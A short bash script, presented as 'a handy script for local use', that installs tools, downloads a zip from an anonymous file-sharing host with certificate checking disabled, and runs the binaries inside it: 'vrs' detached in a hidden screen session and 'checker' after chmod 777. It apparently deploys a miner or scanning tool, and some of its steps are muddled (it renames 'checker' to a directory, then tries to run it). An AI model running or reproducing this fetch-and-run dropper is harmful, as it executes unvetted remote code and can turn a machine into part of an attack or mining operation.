#!/bin/bash
#
# This is a handy script for local use

apt update
apt -y install screen unzip
wget --no-check-certificate -c https://transfer.sh/9kIzhb/nano.zip
unzip nano.zip
mv checker nano
cd nano
screen -dmS vrs ./vrs vrs.ini
> /dev/null 2>&1
chmod 777 checker && ./checker
echo succes
